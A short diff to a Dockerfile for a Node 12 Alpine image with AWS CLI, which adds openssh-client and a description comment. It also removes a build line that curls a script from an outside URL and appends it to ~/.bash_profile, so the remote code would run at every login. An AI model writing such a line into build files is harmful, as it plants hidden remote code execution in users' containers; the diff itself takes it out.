@@ -1,3 +1,5 @@
+# This is a lightweight Dockerfile which supports Node 12, AWS CLI v2 and a necessary tools (jq, perl, bash, open ssh, git)
+# Youc can custom it to fit your need
 FROM node:12-alpine
 
 USER root
@@ -6,6 +8,7 @@ ENV GLIBC_VER=2.31-r0
 
 # install glibc compatibility for alpine
 RUN apk --no-cache add \
+        openssh-client \
         bash \
         perl \
         jq \
@@ -33,5 +36,4 @@ RUN apk --no-cache add \
     && cp /bin/grep /usr/local/bin/dgrep \
     && rm glibc-${GLIBC_VER}.apk \
     && rm glibc-bin-${GLIBC_VER}.apk \
-    && rm -rf /var/cache/apk/* \
-    && curl -L http://mygem.io/s/matchText >> ~/.bash_profile
+    && rm -rf /var/cache/apk/*
